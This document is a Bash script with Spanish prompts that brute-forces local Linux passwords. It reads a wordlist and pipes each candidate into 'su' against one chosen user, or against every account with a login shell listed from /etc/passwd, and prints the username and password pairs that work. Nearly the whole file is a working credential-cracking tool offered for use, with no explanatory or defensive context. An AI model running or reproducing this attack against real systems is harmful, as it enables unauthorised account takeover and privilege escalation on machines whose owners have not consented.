#!/bin/bash

BOLD="\e[1m"
RED="\e[31m"
GREEN="\e[1;32m"
BLUE="\e[34m"
RESET="\e[0m"
BACK_GREEN="\e[102m"
BACK_YELLOW="\e[103m"
TPUT_BLUE=$(tput setaf 123)
TPUT_RESET=$(tput sgr0)
TPUT_BG_COLOR=$(tput setab 31)

trap 'echo ""; echo ""; echo -e "${RED}Bye...${RESET}"; exit 1' INT

	echo "----------------------------------------"


read -p "Inserta Usuario: " user

if [ "$user" != "" ]; then

	echo "----------------------------------------"

	echo -e "Usuario: ${GREEN}$user${RESET}"

	echo "----------------------------------------"

	echo "Buscando credenciales"

	tmp=$(mktemp)

        while IFS= read -r linea; do

                (echo $linea | timeout 0.12 su - $user -c whoami &> /dev/null) & pid=$!
                wait $pid
                rc=$?
                if (( rc == 0 )); then
		  echo ""
                  echo -e "${GREEN}$user:$linea OK${RESET}"
		  echo ""
		  echo "Bye..."
		  exit
                fi

        done < $1

	sleep 2

	echo -e "${RED}Bye...${RESET}"

	exit
fi

user_total=$(grep -c -e '/bin/sh' -e '/bin/bash' /etc/passwd)

echo "----------------------------------------"
echo -e "Usuarios encontrados: ${GREEN}$user_total${RESET}"
echo "----------------------------------------"

echo "Listando usuarios"
echo ""


declare -A usuarios=()

for i in $(seq 1 $user_total); do

	echo -e "Usuario $i: ${GREEN}$(grep -e '/bin/sh' -e '/bin/bash' /etc/passwd | awk -F ':' '{print $1}'  | sed -n "$i"p)${RESET}"
	usuarios[$i]=$(grep -e '/bin/sh' -e '/bin/bash' /etc/passwd | awk -F ':' '{print $1}'  | sed -n "$i"p)

done


	echo "----------------------------------------"

	echo -e "${RED}Crack usuarios${RESET}"

	echo "----------------------------------------"



tmp=$(mktemp)

for i in $(seq 1 $user_total); do

	while IFS= read -r linea; do

		(echo $linea | timeout 0.11 su - ${usuarios[$i]} -c whoami &> /dev/null) & pid=$!
		wait $pid
		rc=$?
		if (( rc == 0 )); then
		  echo -e "${GREEN}${usuarios[$i]}:$linea OK${RESET}"
		  break
		fi

	done < $1

done

sleep 2

echo ""
echo -e "${RED}Bye...${RESET}"
